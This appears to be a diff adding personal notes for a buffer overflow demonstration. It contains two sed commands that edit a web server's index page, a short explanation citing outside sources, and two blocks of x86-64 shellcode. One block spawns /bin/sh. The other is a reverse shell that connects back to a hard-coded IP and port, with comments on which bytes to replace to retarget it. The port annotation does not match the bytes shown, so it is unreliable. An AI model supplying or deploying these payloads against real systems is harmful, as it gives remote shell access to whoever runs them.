@@ -1,0 +1,24 @@
+sed -i '/<\/body>/i <p>Ons Chouaibi</p>' /var/www/html/index.html
+sed -i '/<p>Ons Chouaibi<\/p>/d' /var/www/html/index.html
+
+
+
+
+The code is a demonstration of a buffer overflow attack. It's inspired by this video (`"https://www.youtube.com/watch?v=btkuAEbcQ80"`) which summarizes the concept of a buffer overflow attack. We execute a shell code to open a terminal shell /
+bin/sh. The shell code reference can be found here (`https://www.exploit-db.com/exploits/43550`).
+
+shellcode[] = { 0x31, 0xc0, 0x48, 0xbb, 0xd1, 0x9d, 0x96, 0x91, 0xd0, 0x8c, 0x97, 0xff, 0x48, 0xf7, 0xdb, 0x53, 0x54, 0x5f, 0x99, 0x52, 0x57, 0x54, 0x5e, 0xb0, 0x3b, 0x0f, 0x05 };
+
+
+\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a
+\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0
+\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24
+\x02\x02\x00\xba\x25\xc7\x44\x24\x04\xac\x12\xf1\x76\x48\x89\xe6\x6a\x10
+\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48
+\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a
+\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54
+\x5f\x6a\x3b\x58\x0f\x05
+
+// You only need to replace the two dword constants:
+"\xc7\x04\x24\x02\x00\xba\x25"       // Port 9658 → 0x25ba0002
+"\xc7\x44\x24\x04\xac\x12\xf1\x76"   // IP 172.18.241.118 → 0x76f112ac
